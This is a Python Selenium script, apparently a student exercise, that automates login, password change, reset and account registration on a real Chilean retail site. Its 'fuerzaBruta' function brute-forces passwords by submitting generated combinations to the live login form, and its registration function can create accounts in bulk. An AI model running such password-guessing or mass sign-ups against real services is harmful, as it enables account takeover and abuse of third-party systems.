from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait,Select
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

import os
import time
import itertools
path=os.path.dirname(os.path.abspath(__file__))#Ruta del archivo py
pathDriver=os.path.join(path,"msedgedriver.exe") # Ruta del controlador (Edge Chromium)

 
Browser = webdriver.Edge(executable_path=pathDriver)

def setBrowser():#Inicia el navegador y abre la pagina elegida
    Browser.get("https://www.natura.cl")
    time.sleep(3)

def login(username,password):#Inicia sesion en la pagina elegida
    login= Browser.find_element_by_xpath("//*[contains(text(),'Inicia Sesión')]")
    Browser.execute_script("arguments[0].click();",login)
    
    user= WebDriverWait(Browser,10).until(EC.presence_of_element_located((By.XPATH,"//*[@id='root']/div/div/div[1]/div/div/div/div[2]/div/div[1]/form/div[1]/div/input")))
    user.send_keys(Keys.CONTROL + 'a')
    user.send_keys(Keys.DELETE)
    user.send_keys(username)
    time.sleep(1)

    pwd=WebDriverWait(Browser,10).until(EC.presence_of_element_located((By.XPATH,"//*[@id='root']/div/div/div[1]/div/div/div/div[2]/div/div[1]/form/div[2]/div/div/input")))
    pwd.send_keys(Keys.CONTROL + 'a')
    pwd.send_keys(Keys.DELETE)
    pwd.send_keys(password)
    time.sleep(1)
    pwd.send_keys(Keys.ENTER)

def changePassword(username,password,newPassword):#falta terminar
    login(username,password)

    Browser.get("https://www.natura.cl/mis-datos")#intente acceder mediante codigo pero al ser un dropdown se activaba mediante js al pasar el mouse.
    time.sleep(1)
    user= WebDriverWait(Browser,10).until(EC.presence_of_element_located((By.XPATH,"//*[@id='root']/div/div/div[2]/div/div[2]/div/div[8]/a")))
    Browser.execute_script("arguments[0].click();",user)
    time.sleep(1)

    pwd=Browser.find_element_by_name("password").send_keys(newPassword + Keys.ENTER)
    time.sleep(1)
    
    pwd=Browser.find_element_by_name("confirmPassword")
    pwd.send_keys(newPassword)
    pwd.send_keys(Keys.ENTER)
    time.sleep(2)
    print("cambio de contraseña exitoso")

def resetPassword(email):
    
    login= Browser.find_element_by_xpath("//*[contains(text(),'Inicia Sesión')]")
    Browser.execute_script("arguments[0].click();",login)
    time.sleep(1)
    Browser.find_element_by_xpath("//*[@id='root']/div/div/div[1]/div/div/div/div[2]/div/a").click()

    user=WebDriverWait(Browser,10).until(EC.presence_of_element_located((By.XPATH,"//*[@id='root']/div/div/div[1]/div/div/div/div[2]/div/div[2]/div[1]/div/div/div/div/form/div/div/input")))
    user.send_keys(email + Keys.ENTER)
    print("reset exitoso")

def createAcc(name,lastname,email,password,rut,birth="01/01/1990",gender="Masculino",phone=999999999):
    
    login= Browser.find_element_by_xpath("//*[contains(text(),'Regístrate')]")
    Browser.execute_script("arguments[0].click();",login)
    time.sleep(2)


    user= Browser.find_element_by_name("firstName")
    user.send_keys(name)
    time.sleep(2)

    user = Browser.find_element_by_name("lastName")
    user.send_keys(lastname)
    time.sleep(1)

    user= Browser.find_element_by_name("email")
    user.send_keys(email)
    time.sleep(1)

    user= Browser.find_element_by_name("password")
    user.send_keys(password)
    time.sleep(1)

    user = Browser.find_element_by_name("confirmPassword")
    user.send_keys(password)
    time.sleep(1)

    user= Browser.find_element_by_name("cpf")
    user.send_keys(rut)
    time.sleep(1)

    usuario= Browser.find_element_by_name("dateOfBirth")
    usuario.send_keys(birth)
    time.sleep(1)

    if gender == 'Femenino':
        try:
            user = Browser.find_element_by_xpath("//*[contains(text(),'Femenino')]").click()
        except NoSuchElementException as e:
            print('error')
        raise e 
    elif gender == 'Masculino':
        try:
            user = Browser.find_element_by_xpath("//*[contains(text(),'Masculino')]").click()
        except NoSuchElementException as e:
            print('error')
    time.sleep(1)
        
    user= Browser.find_element_by_xpath("//*[@id='root']/div/div/div[1]/div/div/div[3]/form/fieldset[2]/div/div[2]/div/input")
    user.send_keys(phone)
    time.sleep(1)

    user=Browser.find_element_by_xpath("//*[@id='root']/div/div/div[1]/div/div/div[3]/form/div[10]/label/input")
    Browser.execute_script("arguments[0].click();",user)
    time.sleep(1)

    user=Browser.find_element_by_xpath("//*[@id='root']/div/div/div[1]/div/div/div[3]/form/div[11]/button[2]").click()

def close():
    Browser.close()

def fuerzaBruta(email,base="abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ0123456789",intentos=100,largoMin=6):
    chars=[]
    for char in base:
        chars.append(char)
    contador=0
    for tam in range(largoMin,len(chars)):
        for pwd in itertools.product(chars,repeat=tam):
            if contador <= intentos:
                print('Intento:',contador, 'clave',pwd)
                login(email,pwd)
            else:
                break    
            time.sleep(2)
            contador += 1


if __name__== "__main__":
    setBrowser()
    #createAcc("juanito","perez","pruebacripto2@yopmail.com","contra123","21377161-2","15/02/1989","Masculino")
    #login("pruebacripto2@yopmail.com","contra123")
    #resetPassword("pruebacripto2@yopmail.com")
    #changePassword("pruebacripto2@yopmail.com","contra123","nuevaContra123")
    #fuerzaBruta("pruebacripto2@yopmail.com")
    time.sleep(20)
    close()
